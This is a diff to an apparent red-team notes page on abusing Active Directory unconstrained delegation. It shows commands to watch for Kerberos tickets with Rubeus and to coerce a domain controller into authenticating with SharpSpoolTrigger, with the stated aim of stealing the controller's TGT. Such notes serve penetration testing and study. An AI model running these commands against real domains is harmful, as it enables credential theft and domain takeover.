@@ -16,17 +16,21 @@ ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.11
 ```
 !!! alert "Domain Controllers are always permitted for unconstrained delegation."
 ## Exploit
-### Force DC to auth to our box and steal tgt
+#### Force DC to auth to our box and steal TGT
 Monitor for tickets with Rubeus
 ```bat
 Rubeus.exe monitor /interval:10 /nowrap
 ```
+
+see: [Authentication Coercion](Authentication%20Coercion.md)
+
+OR:
 Run [https://github.com/cube0x0/SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) to coerce authentication
 ```powershell
 SharpSpoolTrigger.exe dc01.lab.local web.dev.lav.local
 ```
 Where:
-
 - DC01 is the "target".
 - WEB is the "listener".
+
 **Rebeus should capture a ticket**
